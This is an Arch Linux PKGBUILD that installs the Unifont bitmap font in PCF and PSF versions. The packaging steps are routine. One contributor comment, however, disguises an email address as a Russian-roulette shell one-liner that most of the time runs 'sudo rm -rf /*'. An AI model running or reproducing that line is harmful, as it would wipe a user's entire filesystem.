# Maintainer: neeshy <neeshy@tfwno.gf>
# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgname=('pcf-unifont'
         'psf-unifont')
pkgbase=unifont
pkgver=15.0.06
pkgrel=1
pkgdesc="A free bitmap font with wide Unicode support (PCF, PSF and hex versions)"
arch=('any')
url="https://unifoundry.com/"
license=('GPL2' 'custom:OFL')
source=("https://unifoundry.com/pub/unifont/unifont-$pkgver/unifont-$pkgver.tar.gz"{,.sig})
sha256sums=('36668eb1326d22e1466b94b3929beeafd10b9838bf3d41f4e5e3b52406ae69f1'
            'SKIP')
validpgpkeys=('95D2E9AB8740D8046387FD151A09227B1F435A33') # Paul Hardy <unifoundry@unifoundry.com>

package_pcf-unifont() {
  pkgdesc="A free bitmap font with wide Unicode support (PCF version)"

  cd "$srcdir/unifont-$pkgver/font/precompiled"
  install -Dm644 "unifont-$pkgver.pcf.gz" "$pkgdir/usr/share/fonts/misc/unifont.pcf.gz"
}

package_psf-unifont() {
  pkgdesc="A free bitmap font with wide Unicode support (PSF version)"

  cd "$srcdir/unifont-$pkgver/font/precompiled"
  install -Dm644 "Unifont-APL8x16-$pkgver.psf.gz" "$pkgdir/usr/share/kbd/consolefonts/Unifont-APL8x16.psf.gz"
}
